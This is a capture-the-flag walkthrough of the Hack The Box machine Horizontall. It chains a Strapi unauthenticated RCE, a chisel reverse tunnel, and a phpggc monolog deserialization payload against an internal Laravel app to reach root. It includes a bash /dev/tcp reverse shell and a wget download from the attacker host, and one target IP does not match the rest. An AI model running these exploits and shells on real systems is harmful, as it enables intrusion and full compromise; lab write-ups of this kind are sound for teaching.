# HTB: Horizontall

**Difficulty:** Easy **OS:** Linux (Ubuntu) **Target IP:** 10.129.73.95 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```
nmap -p22,80 -sCV 10.129.73.95 -oA nmap/nmap
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

Only SSH and HTTP were open — a small attack surface, so the web application was going to be the way in. The nginx redirect target, `horizontall.htb`, was a virtual host the server expected me to request by name rather than by IP, so I added it to `/etc/hosts` before doing anything else.

---

## 2. Web Enumeration — Finding a Hidden API Subdomain

### 2.1 The Static Site

Browsing `http://horizontall.htb` showed a static single-page site (a Vue.js frontend, based on the compiled `app.c68eb462.js` bundle). Rather than clicking through the UI, I pulled the JS bundle directly and read through it, since client-side bundles for API-driven frontends almost always hardcode the backend's URL somewhere.

```
curl http://horizontall.htb/js/app.c68eb462.js
```

Digging through the minified code, I found the actual API call the frontend makes to populate its content:

```js
getReviews: function() {
    var t = this;
    r.a.get("http://api-prod.horizontall.htb/reviews").then(...)
}
```

This revealed a second virtual host, `api-prod.horizontall.htb`, that isn't linked anywhere in the visible site — the frontend talks to it purely via client-side JavaScript. I added it to `/etc/hosts` as well.

### 2.2 Identifying Strapi

```
curl http://api-prod.horizontall.htb
```

```
<title>Welcome to your API</title>
<h1>Welcome.</h1>
```

A generic "Welcome to your API" landing page on its own isn't very telling, but running `whatweb` against it filled in the gap:

```
whatweb http://api-prod.horizontall.htb
```

```
X-Powered-By[Strapi <strapi.io>]
```

The `X-Powered-By` header identified the backend as **Strapi**, a Node.js-based headless CMS. Strapi has had several well-documented pre-authentication RCE vulnerabilities in its older versions, so at this point the plan was clear: fingerprint the exact version and check it against known Strapi CVEs.

---

## 3. Foothold — Strapi RCE (CVE-2019-19609)

### 3.1 Selecting the Exploit

Given the confirmed Strapi instance, I pulled a public proof-of-concept for **CVE-2019-19609** — an unauthenticated RCE in older Strapi versions caused by the password-reset endpoint passing user-controlled input into a Node.js `lodash` call in a way that can be abused to overwrite the plugin configuration used by the plugin installer, ultimately leading to arbitrary code execution during a plugin install:

```
git clone https://github.com/glowbase/CVE-2019-19609
```

### 3.2 Running the Exploit

```
python3 exploit.py http://api-prod.horizontall.htb 10.10.15.146 4444
```

```
[+] Checking Strapi CMS version
[+] Looks like this exploit should work!
[+] Executing exploit
```

With a listener waiting:

```
nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.73.95] 59032
$ whoami
strapi
```

✅ **Foothold obtained** as the `strapi` service user. The exploit confirmed the vulnerable version check passed before firing, which is why it worked cleanly on the first attempt.

---

## 4. Internal Enumeration — Finding a Second, Internal-Only App

Once on the box, I checked what services were listening locally, since Strapi being the only externally exposed application on this host felt unlikely for a machine with this much going on:

```
ss -tulnp
```

```
tcp    LISTEN   0      128    127.0.0.1:1337    node
tcp    LISTEN   0      128    127.0.0.1:8000
tcp    LISTEn   0      80     127.0.0.1:3306
```

This was the key discovery for the rest of the box:
- **1337** — Strapi's own admin/API port, bound to localhost only (nginx proxies the public vhost to it)
- **3306** — MySQL, also localhost-only, almost certainly Strapi's backing database
- **8000** — an entirely separate, unidentified service, also localhost-only

Port 8000 wasn't something I'd seen from outside, and it wasn't part of Strapi — this meant there was a second web application running on the box that was never meant to be reached directly from the internet, only from other local services (or nginx, which apparently doesn't proxy it publicly). To actually interact with it, I needed to pivot my traffic through the box itself.

### 4.1 Pivoting with Chisel

I stood up a chisel server on my attacker box to receive a reverse tunnel:

```
chisel server --reverse -p 8001
```

Then pulled a chisel binary onto the target and connected back, forwarding the interesting local ports to my own machine:

```
wget http://10.10.15.146/chisel
chmod +x chisel
./chisel client 10.10.15.146:8001 R:8000:127.0.0.1:8000 R:1337:127.0.0.1:1337 R:3306:127.0.0.1:3306
```

```
client: Connecting to ws://10.10.15.146:8001
client: Connected (Latency 260.342296ms)
```

With the reverse tunnel established, `127.0.0.1:8000` on my own Kali box now transparently routes to port 8000 on the target.

### 4.2 Identifying the Hidden App

```
curl http://127.0.0.1:8000
```

The response was a full HTML page with `<title>Laravel</title>` and a footer reading **"Laravel v8 (PHP v7.4.18)"** — a second, completely separate web application (PHP/Laravel) running only on localhost, invisible from outside the box, and clearly not meant to be reached except by whatever internal process talks to it on port 8000.

---

## 5. Privilege Escalation — Laravel Deserialization RCE

### 5.1 Selecting the Exploit

A known Laravel version paired with an exposed debug/log-based deserialization gadget chain is a strong lead — I found a public exploit toolkit targeting exactly this class of Laravel vulnerability:

```
git clone https://github.com/ambionics/laravel-exploits
```

This exploit chain works by abusing Laravel's log file (`storage/logs/laravel.log`) as a place to smuggle a PHP object serialization payload, then triggering the app's exception/log-viewing path to deserialize it. When the injected object is a known-vulnerable "gadget chain" — here targeting the `monolog` logging library that Laravel uses internally — PHP's deserialization process ends up invoking arbitrary code as a side effect of just reconstructing the (malicious) object graph. `phpggc` ("PHP Generic Gadget Chains") is the standard tool for actually building those malicious serialized payloads without having to hand-craft the gadget chain myself.

### 5.2 Building the Payload

I generated a PHAR file containing a `monolog/rce1` gadget chain, first testing with a harmless command:

```bash
cd phpggc
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
```

### 5.3 Testing the Exploit

```bash
cd ..
python3 laravel-rce.py http://127.0.0.1:8000 /tmp/exploit.phar
```

```
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

`id` returning `uid=0(root)` confirmed the Laravel instance backing this internal-only app runs as **root** — likely because it's meant to only be reachable by trusted local services and was never hardened with that assumption removed. This gave direct root-level command execution, reachable only because of the chisel pivot exposing the otherwise-unreachable port 8000.

### 5.4 Getting a Root Shell

I rebuilt the payload with a proper reverse shell command instead of `id`:

```bash
php -d phar.readonly=0 ./phpggc \
  --phar phar \
  -f \
  -o /tmp/exploit.phar \
  monolog/rce1 system 'bash -c "exec bash -i >& /dev/tcp/10.10.15.146/4445 0>&1"'
```

With a listener ready:

```
nc -lvnp 4445
```

Then triggered it the same way:

```
python3 laravel-rce.py http://127.0.0.1:8000 /tmp/exploit.phar
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.73.112] 53054
root@horizontall:/home/developer/myproject/public# cd /root
root@horizontall:~# cat root.txt
```

✅ **Full compromise** — root shell obtained through the internal Laravel instance's deserialization RCE, reached entirely via the chisel tunnel pivoted through the initial Strapi foothold.

---

## 6. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` → SSH + nginx on port 80, redirecting to a named vhost |
| Subdomain discovery | Read the compiled Vue.js bundle (`app.c68eb462.js`) directly, found a hardcoded API call to a second, unlisted vhost — `api-prod.horizontall.htb` |
| Service fingerprinting | `whatweb` identified the API vhost as running **Strapi** via the `X-Powered-By` header |
| Foothold | Exploited **CVE-2019-19609** (Strapi unauthenticated RCE via a plugin-install config overwrite) → shell as `strapi` |
| Internal discovery | `ss -tulnp` revealed a second, localhost-only web app on port 8000 (Laravel), invisible from outside the box |
| Pivoting | Used **chisel** in reverse mode to tunnel the internal port 8000 (plus 1337/3306) back to my attacker machine |
| Privesc | Used `phpggc` to build a `monolog/rce1` PHP deserialization gadget chain, delivered via a public Laravel log-poisoning exploit → command execution as **root** |

**Root cause / lessons learned:**

- Client-side JavaScript bundles routinely leak backend infrastructure details (internal hostnames, undocumented API endpoints) that aren't visible anywhere in the rendered site — reading the compiled JS directly is a cheap, high-value recon step.
- Running an outdated, publicly-known-vulnerable CMS version (Strapi, vulnerable to CVE-2019-19609) with no authentication requirement on the affected endpoint gave immediate, unauthenticated RCE — keeping CMS platforms patched is critical precisely because their vulnerabilities tend to be extremely well documented and trivially weaponized.
- Binding a second application to `127.0.0.1` is not a security boundary by itself — it only prevents *direct* external access. Once any foothold exists on the host, "internal-only" services become reachable via a tunnel/pivot exactly as if they were public.
- Running that internal Laravel application as **root** turned what should have been a contained internal service into an instant privilege escalation path the moment any deserialization flaw was found in it — internal services should run with the least privilege actually required, not root, specifically because "nothing external can reach it" is not a guarantee that holds once a host is compromised.

---

## 7. Tools Used

- `nmap` — reconnaissance
- `curl`, `whatweb` — web/vhost enumeration and service fingerprinting
- **CVE-2019-19609 exploit** (`glowbase/CVE-2019-19609`) — unauthenticated Strapi RCE for the initial foothold
- `chisel` — reverse tunnel/pivot to reach the internal-only Laravel service on port 8000
- **Laravel deserialization exploit toolkit** (`ambionics/laravel-exploits`) — log-poisoning-based PHP object injection
- `phpggc` (PHP Generic Gadget Chains) — building the `monolog/rce1` deserialization payload
